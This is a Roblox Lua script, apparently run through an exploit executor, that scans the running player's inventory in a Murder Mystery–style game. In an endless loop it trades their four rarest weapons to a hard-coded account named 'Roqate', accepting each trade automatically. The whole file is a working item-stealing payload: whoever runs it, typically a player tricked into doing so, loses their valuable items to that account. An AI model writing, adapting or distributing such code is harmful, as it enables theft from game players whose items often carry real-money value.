local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.3
local UI_WAIT_TIMEOUT = 10
local ACCEPT_WAIT_TIMEOUT = 20

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Find correct inventory ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

-- === Collect ONLY top 4 weapons ===
local function getTop4Weapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    -- Sort highest rarity → lowest
    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    -- Take ONLY top 4
    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === Check if UI element exists with text ===
local function uiElementExistsWithText(parent, text)
    for _, element in ipairs(parent:GetDescendants()) do
        if element:IsA("TextLabel") or element:IsA("TextButton") then
            if string.find(element.Text:lower(), text:lower()) then
                return true
            end
        end
    end
    return false
end

-- === Wait for Trade GUI ===
local function waitForTradeGUI()
    local startTime = os.clock()
    while os.clock() - startTime < UI_WAIT_TIMEOUT do
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then
            -- Check if "your offer" is visible
            if uiElementExistsWithText(gui, "your offer") then
                return gui
            end
        end
        task.wait(0.2)
    end
    return nil
end

-- === Wait for "OTHER PLAYER HAS ACCEPTED" ===
local function waitForOtherAccept(gui)
    local startTime = os.clock()
    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
        if uiElementExistsWithText(gui, "other player has accepted") then
            return true
        end
        
        -- Also check if trade was completed (UI disappeared)
        if not gui.Parent then
            return true
        end
        
        task.wait(0.5)
    end
    return false
end

-- === Check if all items are added ===
local function areItemsAdded(gui, items)
    for _, item in ipairs(items) do
        if not uiElementExistsWithText(gui, item:lower()) then
            return false
        end
    end
    return true
end

-- === Add weapons to trade ===
local function addWeaponsToTrade(gui)
    local weapons = getTop4Weapons()
    if #weapons == 0 then
        warn("⚠ No valid weapons found!")
        return false
    end

    print("✅ Adding weapons:")
    for _, w in ipairs(weapons) do
        -- Check if item is already added
        if not uiElementExistsWithText(gui, w:lower()) then
            print("   →", w)
            TradeRemotes.OfferItem:FireServer(w, "Weapons")
            task.wait(ITEM_ADD_DELAY)
        else
            print("   →", w, "(already added)")
        end
    end
    
    -- Verify all items were added
    if areItemsAdded(gui, weapons) then
        print("✅ All items successfully added")
        return true
    else
        warn("⚠ Not all items were added!")
        return false
    end
end

-- === Accept trade ===
local function acceptTrade()
    print("✅ Accepting trade...")
    pcall(function()
        TradeRemotes.AcceptTrade:FireServer()
    end)
end

-- === Full trade cycle ===
local function doTradeCycle(targetPlayer)
    print("\n🔄 Starting trade cycle with", targetPlayer.Name)
    
    -- Send trade request
    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not success then
        warn("❌ Trade request failed:", err)
        return
    end
    print("✅ Trade request sent")

    -- Wait for trade GUI with "your offer" visible
    local gui = waitForTradeGUI()
    if not gui then
        warn("⚠ Trade GUI not opened or 'your offer' not found!")
        return
    end
    print("✅ Trade GUI found")

    -- Add weapons
    if not addWeaponsToTrade(gui) then
        return
    end

    -- Wait for other player to accept
    print("⏳ Waiting for other player to accept...")
    if waitForOtherAccept(gui) then
        print("✅ Other player accepted - completing trade")
        acceptTrade()
    else
        warn("⚠ Timeout waiting for other player to accept!")
    end
    
    -- Wait for UI to disappear (trade completed)
    local startTime = os.clock()
    while gui.Parent and os.clock() - startTime < 5 do
        task.wait(0.5)
    end
end

-- === Main loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "...")
    end
    task.wait(TRADE_COOLDOWN)
end
